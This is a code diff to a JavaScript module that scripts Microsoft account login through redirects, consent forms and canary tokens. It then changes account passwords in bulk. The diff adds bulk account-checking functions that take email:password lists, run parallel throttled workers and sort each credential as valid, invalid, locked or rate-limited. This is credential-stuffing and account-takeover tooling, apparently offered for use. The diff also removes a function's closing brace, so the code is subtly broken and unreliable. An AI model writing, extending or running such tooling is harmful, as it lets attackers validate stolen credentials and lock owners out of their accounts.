@@ -23,6 +23,49 @@ function getCookieString(cookieJar) {
   return cookieJar.join("; ");
 }
 
+function decodeHtmlEntities(str) {
+  return str
+    .replace(/&amp;/gi, "&")
+    .replace(/\\u0026/gi, "&")
+    .replace(/&#x2f;/gi, "/")
+    .replace(/&#47;/gi, "/");
+}
+
+function extractClientRedirectUrl(html, baseUrl) {
+  const patterns = [
+    /<meta[^>]*http-equiv=["']?refresh["']?[^>]*content=["'][^"']*url\s*=\s*([^"'>]+)["']/i,
+    /location\.replace\(\s*["']([^"']+)["']\s*\)/i,
+    /(?:window|document|top)\.location(?:\.href)?\s*=\s*["']([^"']+)["']/i,
+  ];
+
+  for (const pattern of patterns) {
+    const match = html.match(pattern);
+    if (!match || !match[1]) continue;
+
+    const raw = decodeHtmlEntities(match[1].trim());
+    if (!raw || raw.startsWith("javascript:")) continue;
+
+    try {
+      return new URL(raw, baseUrl).href;
+    } catch {
+      continue;
+    }
+  }
+
+  return null;
+}
+
+function isPasswordChangeContext(pageHtml, finalUrl = "") {
+  const onPasswordUrl = /account\.live\.com\/.*password\/change/i.test(finalUrl);
+  const hasPasswordMarkers =
+    pageHtml.includes("NewPassword") ||
+    pageHtml.includes("iNewPwd") ||
+    pageHtml.includes("ChangePasswordForm") ||
+    pageHtml.includes("API/ChangePassword");
+
+  return onPasswordUrl && hasPasswordMarkers;
+}
+
 async function sessionFetch(url, options, cookieJar) {
   let currentUrl = url;
   let method = options.method || "GET";
@@ -45,12 +88,25 @@ async function sessionFetch(url, options, cookieJar) {
       const location = res.headers.get("location");
       if (!location) break;
       currentUrl = new URL(location, currentUrl).href;
-      if (status !== 307 && status !== 308) { method = "GET"; body = undefined; }
+      if (status !== 307 && status !== 308) {
+        method = "GET";
+        body = undefined;
+      }
       try { await res.text(); } catch {}
       continue;
     }
 
     const text = await res.text();
+
+    // Some Microsoft pages redirect via meta refresh or JS, not HTTP 3xx
+    const clientRedirect = extractClientRedirectUrl(text, currentUrl);
+    if (clientRedirect && clientRedirect !== currentUrl) {
+      currentUrl = clientRedirect;
+      method = "GET";
+      body = undefined;
+      continue;
+    }
+
     return { res, text, finalUrl: currentUrl };
   }
   throw new Error("Too many redirects");
@@ -76,10 +132,9 @@ async function loginToAccountLive(email, password, cookieJar, headers, debug) {
   debug("S1", `Redirected to: ${loginUrl.substring(0, 80)}, len: ${loginPage.length}`);
 
   // If we're already on the password change page (unlikely but handle it)
-  // Only consider we're on the password change page if we see the actual form
-  if (loginPage.includes("ChangePassword") && (loginPage.includes("NewPassword") || loginPage.includes("apiCanary"))) {
+  if (isPasswordChangeContext(loginPage, loginUrl)) {
     debug("S1", "Already on password change page (no login needed)");
-    return { success: true, page: loginPage, alreadyOnPwdPage: true };
+    return { success: true, page: loginPage, finalUrl: loginUrl, alreadyOnPwdPage: true };
   }
 
   // Extract PPFT
@@ -142,15 +197,14 @@ async function loginToAccountLive(email, password, cookieJar, headers, debug) {
   }
 
   // If we landed on the password change page already (ideal case)
-  // Only trust this if we see actual password change indicators, not just apiCanary
-  if (afterLogin.includes("ChangePassword") && (afterLogin.includes("NewPassword") || 
-      (afterLogin.includes("apiCanary") && afterLogin.includes("password/Change")))) {
+  if (isPasswordChangeContext(afterLogin, afterLoginUrl)) {
     debug("S2", "Landed directly on password change page after login!");
-    return { success: true, page: afterLogin, alreadyOnPwdPage: true };
+    return { success: true, page: afterLogin, finalUrl: afterLoginUrl, alreadyOnPwdPage: true };
   }
 
   // Handle consent/intermediate forms
   let currentPage = afterLogin;
+  let currentUrl = afterLoginUrl;
   if (currentPage.includes("cancel?mkt=")) {
     debug("S2", "Handling consent form");
     const iptMatch = currentPage.match(/(?<="ipt" value=").+?(?=">)/);
@@ -162,49 +216,49 @@ async function loginToAccountLive(email, password, cookieJar, headers, debug) {
       const formBody = new URLSearchParams({
         ipt: iptMatch[0], pprid: ppridMatch[0], uaid: uaidMatch[0],
       });
-      const { text: consentPage } = await sessionFetch(actionMatch[0], {
+      const consentResult = await sessionFetch(actionMatch[0], {
         method: "POST",
         headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
         body: formBody.toString(),
       }, cookieJar);
-      currentPage = consentPage;
+      currentPage = consentResult.text;
+      currentUrl = consentResult.finalUrl;
     }
   }
 
   // Submit any remaining intermediate forms (stay signed in, etc.)
   for (let i = 0; i < 5; i++) {
-    // Check if we've reached the password page - need specific indicators
-    if (currentPage.includes("ChangePassword") && (currentPage.includes("NewPassword") || 
-        currentPage.includes("apiCanary"))) {
+    if (isPasswordChangeContext(currentPage, currentUrl)) {
       debug("S2", "Reached password change page via intermediate forms");
-      return { success: true, page: currentPage, alreadyOnPwdPage: true };
+      return { success: true, page: currentPage, finalUrl: currentUrl, alreadyOnPwdPage: true };
     }
 
     const formMatch = currentPage.match(/<form[^>]*action="([^"]+)"/);
     if (!formMatch) break;
 
     const action = formMatch[1];
-    const fullAction = action.startsWith("http") ? action : new URL(action, afterLoginUrl).href;
+    const fullAction = action.startsWith("http") ? action : new URL(action, currentUrl || afterLoginUrl).href;
     debug("S2", `Intermediate form ${i + 1}: ${fullAction.substring(0, 60)}`);
 
     const inputMatches = [...currentPage.matchAll(/<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"/g)];
     const formData = new URLSearchParams();
     for (const m of inputMatches) formData.append(m[1], m[2]);
 
-    const { text: nextPage } = await sessionFetch(fullAction, {
+    const nextResult = await sessionFetch(fullAction, {
       method: "POST",
       headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
       body: formData.toString(),
     }, cookieJar);
 
-    currentPage = nextPage;
+    currentPage = nextResult.text;
+    currentUrl = nextResult.finalUrl;
+
     if (currentPage.length < 100 && currentPage.includes("Too Many")) {
       return { success: false, error: "Rate limited after login", retryable: true };
     }
   }
 
-  return { success: true, page: currentPage };
-}
+  return { success: true, page: currentPage, finalUrl: currentUrl };
 
 // ── Navigate to password change (if not already there) ───────
 
@@ -222,15 +276,13 @@ async function navigateToPasswordChange(cookieJar, headers, email, debug) {
 
   // Handle auto-submit / session establishment forms (fmHF, ar/cancel, etc.)
   for (let i = 0; i < 5; i++) {
-    // Check if we've reached the actual password change page (must be on password URL, not ar/cancel)
-    const isPasswordUrl = pwdUrl.includes("password/Change") || pwdUrl.includes("PasswordChange");
-    if (isPasswordUrl && (pwdPage.includes("apiCanary") || pwdPage.includes("NewPassword"))) {
+    // Check if we've reached the actual password change page
+    if (isPasswordChangeContext(pwdPage, pwdUrl)) {
       debug("S3", `Reached password change page after ${i} intermediate forms`);
       break;
     }
 
     // Check for auto-submit forms (like fmHF with document.fmHF.submit())
-    const formMatch = pwdPage.match(/<form[^>]*(?:name="fmHF"|id="fmHF"|action="([^"]+)")[^>]*>/);
     const actionMatch = pwdPage.match(/<form[^>]*action="([^"]+)"[^>]*>/);
     
     if (!actionMatch || actionMatch[1].includes("javascript")) {
@@ -259,8 +311,7 @@ async function navigateToPasswordChange(cookieJar, headers, email, debug) {
   }
 
   // After intermediate forms, ALWAYS navigate to password/Change explicitly
-  // The ar/cancel page has apiCanary but is NOT the password change page
-  const isOnPwdPage = pwdUrl.includes("password/Change") && pwdPage.includes("apiCanary");
+  const isOnPwdPage = isPasswordChangeContext(pwdPage, pwdUrl);
   if (!isOnPwdPage) {
     debug("S3", "Not on password/Change URL yet, navigating explicitly...");
     await randomDelay(500, 1500);
@@ -271,7 +322,7 @@ async function navigateToPasswordChange(cookieJar, headers, email, debug) {
     
     // Handle any more intermediate forms on this attempt
     for (let i = 0; i < 3; i++) {
-      if (pwdUrl.includes("password/Change") && pwdPage.includes("apiCanary")) break;
+      if (isPasswordChangeContext(pwdPage, pwdUrl)) break;
       const fm = pwdPage.match(/<form[^>]*action="([^"]+)"[^>]*>/);
       if (!fm || fm[1].includes("javascript")) break;
       const action = fm[1].startsWith("http") ? fm[1] : new URL(fm[1], pwdUrl).href;
@@ -293,8 +344,7 @@ async function navigateToPasswordChange(cookieJar, headers, email, debug) {
   let currentPage = pwdPage;
 
   // Handle re-auth if the password page requires it
-  if (currentPage.includes("urlPost") && currentPage.includes("value=") && 
-      !currentPage.includes("apiCanary") && !currentPage.includes("ChangePassword")) {
+  if (currentPage.includes("urlPost") && currentPage.includes("value=") && !isPasswordChangeContext(currentPage, pwdUrl)) {
     debug("S3", "Re-authentication required on password page");
     const ppftMatch = currentPage.match(/sFT\s*:\s*'([^']+)'/s) ||
                       currentPage.match(/value=\\?"(.+?)\\?"/s) ||
@@ -303,21 +353,20 @@ async function navigateToPasswordChange(cookieJar, headers, email, debug) {
                          currentPage.match(/urlPost\s*:\s*'([^']+)'/s);
 
     if (ppftMatch && urlPostMatch) {
-      return { success: true, page: currentPage, needsReAuth: true, urlPost: urlPostMatch[1], ppft: ppftMatch[1] };
+      return { success: true, page: currentPage, finalUrl: pwdUrl, needsReAuth: true, urlPost: urlPostMatch[1], ppft: ppftMatch[1] };
     }
   }
 
-  // Debug: log what we actually got
-  if (!currentPage.includes("apiCanary") && !currentPage.includes("ChangePassword")) {
-    debug("S3", `Page does NOT contain password form. First 500 chars: ${currentPage.substring(0, 500)}`);
+  if (!isPasswordChangeContext(currentPage, pwdUrl)) {
+    debug("S3", `Page does NOT contain password form. URL=${pwdUrl.substring(0, 80)} | First 500 chars: ${currentPage.substring(0, 500)}`);
   }
 
-  return { success: true, page: currentPage };
+  return { success: true, page: currentPage, finalUrl: pwdUrl };
 }
 
 // ── Submit password change ───────────────────────────────────
 
-async function submitPasswordChange(pageHtml, email, oldPassword, newPassword, cookieJar, headers) {
+async function submitPasswordChange(pageHtml, pageUrl, email, oldPassword, newPassword, cookieJar, headers) {
   const debug = (msg) => console.log(`[CHANGER][${email}] PWD: ${msg}`);
 
   if (pageHtml.length < 100) {
@@ -325,11 +374,18 @@ async function submitPasswordChange(pageHtml, email, oldPassword, newPassword, c
     return { email, success: false, error: "Password page not loaded", retryable: true };
   }
 
-  // Debug: check for various field name patterns
-  const hasOldPwd = pageHtml.includes("OldPassword") || pageHtml.includes("iOldPwd") || 
+  // Strong gate: do not call API unless we're actually on password context
+  const hasOldPwd = pageHtml.includes("OldPassword") || pageHtml.includes("iOldPwd") ||
                     pageHtml.includes("oldPassword") || pageHtml.includes("currentPassword") ||
                     pageHtml.includes("proofInput");
-  debug(`Page len: ${pageHtml.length}, has password field: ${hasOldPwd}, has apiCanary: ${pageHtml.includes("apiCanary")}`);
+  const hasNewPwd = pageHtml.includes("NewPassword") || pageHtml.includes("iNewPwd");
+  const isPwdContext = isPasswordChangeContext(pageHtml, pageUrl || "") || hasOldPwd || hasNewPwd;
+
+  debug(`URL: ${(pageUrl || "unknown").substring(0, 100)}, len: ${pageHtml.length}, hasOldPwd: ${hasOldPwd}, hasNewPwd: ${hasNewPwd}, hasApiCanary: ${pageHtml.includes("apiCanary")}`);
+
+  if (!isPwdContext) {
+    return { email, success: false, error: "Session expired (not on password page)", retryable: true };
+  }
 
   try {
     // Extract canary tokens
@@ -338,31 +394,40 @@ async function submitPasswordChange(pageHtml, email, oldPassword, newPassword, c
                         pageHtml.match(/name="canary"[^>]*value="([^"]+)"/s);
     const apiCanary = pageHtml.match(/"apiCanary"\s*:\s*"([^"]+)"/s);
 
-    // Extract session ID and other config from the page
-    const sessionIdMatch = pageHtml.match(/"sessionId"\s*:\s*"([^"]+)"/s);
+    // Extract session tokens and config from the page
     const sctxMatch = pageHtml.match(/"sCtx"\s*:\s*"([^"]+)"/s) ||
                       pageHtml.match(/sCtx\s*=\s*'([^']+)'/s);
     const flowTokenMatch = pageHtml.match(/"sFT"\s*:\s*"([^"]+)"/s) ||
                            pageHtml.match(/sFT\s*:\s*'([^']+)'/s);
 
-    if (apiCanary) {
+    const hasApiEndpoint = pageHtml.includes("API/ChangePassword") || hasNewPwd || hasOldPwd;
+
+    if (apiCanary && hasApiEndpoint) {
       debug("Using API method (JSON) via /API/ChangePassword");
 
-      // Extract uaid from page config
+      // Extract uaid + dynamic ids from page config
       const uaidMatch = pageHtml.match(/"uaid"\s*:\s*"([^"]+)"/s) ||
                         pageHtml.match(/uaid\s*=\s*'([^']+)'/s);
+      const hpgidMatch = pageHtml.match(/"hpgid"\s*:\s*(\d+)/s) ||
+                         pageHtml.match(/name="hpgid"[^>]*value="(\d+)"/s);
+      const scidMatch = pageHtml.match(/"scid"\s*:\s*(\d+)/s) ||
+                        pageHtml.match(/name="scid"[^>]*value="(\d+)"/s);
+
+      const hpgid = hpgidMatch ? hpgidMatch[1] : "200710";
+      const scid = scidMatch ? Number(scidMatch[1]) : 100104;
 
       // Build payload matching Microsoft's current API format
       const jsonBody = JSON.stringify({
         ...(canaryMatch ? { canary: canaryMatch[1] } : {}),
         ...(sctxMatch ? { sCtx: sctxMatch[1] } : {}),
         ...(flowTokenMatch ? { token: flowTokenMatch[1] } : { token: null }),
+        ...(oldPassword ? { oldPassword } : {}),
         password: newPassword,
         expiryEnabled: false,
         uiflvr: 1001,
         ...(uaidMatch ? { uaid: uaidMatch[1] } : {}),
-        scid: 100104,
-        hpgid: 200710,
+        scid,
+        hpgid: Number(hpgid),
       });
 
       const { text: changeText, finalUrl: changeFinalUrl } = await sessionFetch(
@@ -373,7 +438,7 @@ async function submitPasswordChange(pageHtml, email, oldPassword, newPassword, c
             ...headers,
             "Content-Type": "application/json",
             "canary": apiCanary[1],
-            "hpgid": "200710",
+            "hpgid": hpgid,
             "hpgact": "commit",
             "X-Requested-With": "XMLHttpRequest",
           },
@@ -520,18 +585,20 @@ async function attemptChangePassword(email, oldPassword, newPassword, attempt) {
 
   // Check if login already landed us on the password page
   let pwdPage;
-  if (loginResult.alreadyOnPwdPage && loginResult.page.includes("apiCanary")) {
+  let pwdUrl = loginResult.finalUrl || "";
+
+  if (loginResult.alreadyOnPwdPage && isPasswordChangeContext(loginResult.page, loginResult.finalUrl || "")) {
     debug("S2", "Already on password change page from login flow");
     pwdPage = loginResult.page;
   } else {
     // Navigate to password change page explicitly
-    // Even if alreadyOnPwdPage was set, if apiCanary is missing we need to navigate
     const navResult = await navigateToPasswordChange(cookieJar, headers, email, debug);
     if (!navResult.success) {
       return { email, ...navResult };
     }
 
     pwdPage = navResult.page;
+    pwdUrl = navResult.finalUrl || pwdUrl;
 
     // Handle re-auth on password page
     if (navResult.needsReAuth) {
@@ -540,47 +607,51 @@ async function attemptChangePassword(email, oldPassword, newPassword, attempt) {
         login: email, loginfmt: email, passwd: oldPassword, PPFT: navResult.ppft,
         PPSX: "PassportR", type: "11", LoginOptions: "3",
       });
-      const { text: reAuthPage } = await sessionFetch(navResult.urlPost, {
+      const reAuthResult = await sessionFetch(navResult.urlPost, {
         method: "POST",
         headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
         body: reAuthBody.toString(),
       }, cookieJar);
-      pwdPage = reAuthPage;
+      pwdPage = reAuthResult.text;
+      pwdUrl = reAuthResult.finalUrl;
 
       // Handle intermediate form after re-auth
       const fa = pwdPage.match(/<form[^>]*action="([^"]+)"/);
-      if (fa && !pwdPage.includes("ChangePassword")) {
+      if (fa && !isPasswordChangeContext(pwdPage, pwdUrl)) {
         const im = [...pwdPage.matchAll(/<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"/g)];
         const fd = new URLSearchParams();
         for (const m of im) fd.append(m[1], m[2]);
         const fullAction = fa[1].startsWith("http") ? fa[1] : new URL(fa[1], navResult.urlPost).href;
-        const { text: np } = await sessionFetch(fullAction, {
+        const nextResult = await sessionFetch(fullAction, {
           method: "POST",
           headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
           body: fd.toString(),
         }, cookieJar);
-        pwdPage = np;
+        pwdPage = nextResult.text;
+        pwdUrl = nextResult.finalUrl;
       }
 
       // If still not on password page, try navigating again
-      if (!pwdPage.includes("ChangePassword") && !pwdPage.includes("apiCanary")) {
+      if (!isPasswordChangeContext(pwdPage, pwdUrl)) {
         await randomDelay(1000, 2000);
-        const { text: p2 } = await sessionFetch("https://account.live.com/password/Change", { headers }, cookieJar);
-        pwdPage = p2;
+        const p2 = await sessionFetch("https://account.live.com/password/Change", { headers }, cookieJar);
+        pwdPage = p2.text;
+        pwdUrl = p2.finalUrl;
       }
     }
   }
 
   // Verify we actually have the password change page before submitting
-  if (!pwdPage.includes("apiCanary") && !pwdPage.includes("ChangePassword") && !pwdPage.includes("NewPassword")) {
-    debug("S3", `Not on password change page. Navigating explicitly...`);
+  if (!isPasswordChangeContext(pwdPage, pwdUrl)) {
+    debug("S3", `Not on password change page yet (URL=${(pwdUrl || "unknown").substring(0, 80)}), navigating explicitly...`);
     await randomDelay(500, 1500);
-    const { text: retryPage } = await sessionFetch("https://account.live.com/password/Change", { headers }, cookieJar);
-    pwdPage = retryPage;
+    const retry = await sessionFetch("https://account.live.com/password/Change", { headers }, cookieJar);
+    pwdPage = retry.text;
+    pwdUrl = retry.finalUrl;
   }
 
   // Phase 3: Submit password change
-  return await submitPasswordChange(pwdPage, email, oldPassword, newPassword, cookieJar, headers);
+  return await submitPasswordChange(pwdPage, pwdUrl, email, oldPassword, newPassword, cookieJar, headers);
 }
 
 // ── Main entry with retry ────────────────────────────────────
@@ -603,7 +674,31 @@ async function changePassword(email, oldPassword, newPassword) {
   }
 }
 
-// ── Bulk changer with throttling ─────────────────────────────
+async function checkAccount(email, password) {
+  const cookieJar = [];
+  const headers = { ...DEFAULT_HEADERS };
+  const silentDebug = () => {};
+
+  const loginResult = await loginToAccountLive(email, password, cookieJar, headers, silentDebug);
+
+  if (!loginResult.success) {
+    const error = loginResult.error || "Login failed";
+    if (error.includes("Invalid credentials")) {
+      return { email, success: false, status: "invalid", error: "Invalid credentials" };
+    }
+    if (error.includes("Account locked")) {
+      return { email, success: false, status: "locked", error: "Account locked" };
+    }
+    if (error.includes("Rate limited")) {
+      return { email, success: false, status: "rate_limited", error: "Rate limited" };
+    }
+    return { email, success: false, status: "error", error };
+  }
+
+  return { email, success: true, status: "valid" };
+}
+
+// ── Bulk utilities with throttling ────────────────────────────
 
 async function changePasswords(accounts, newPassword, threads = 3, onProgress, signal) {
   const parsed = accounts.map((a) => {
@@ -636,4 +731,35 @@ async function changePasswords(accounts, newPassword, threads = 3, onProgress, s
   return results;
 }
 
-module.exports = { changePassword, changePasswords };
+async function checkAccounts(accounts, threads = 3, onProgress, signal) {
+  const parsed = accounts.map((a) => {
+    const i = a.indexOf(":");
+    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
+  });
+
+  const results = [];
+  let currentIndex = 0;
+
+  async function worker() {
+    while (true) {
+      if (signal && signal.aborted) break;
+      const idx = currentIndex++;
+      if (idx >= parsed.length) break;
+      await randomDelay(1000, 3000);
+
+      const { email, password } = parsed[idx];
+      const result = await checkAccount(email, password);
+      results.push(result);
+
+      if (onProgress) onProgress(results.length, parsed.length);
+    }
+  }
+
+  const workerCount = Math.min(threads, parsed.length, 5);
+  const workers = Array(workerCount).fill(null).map(() => worker());
+  await Promise.all(workers);
+
+  return results;
+}
+
+module.exports = { changePassword, changePasswords, checkAccount, checkAccounts };
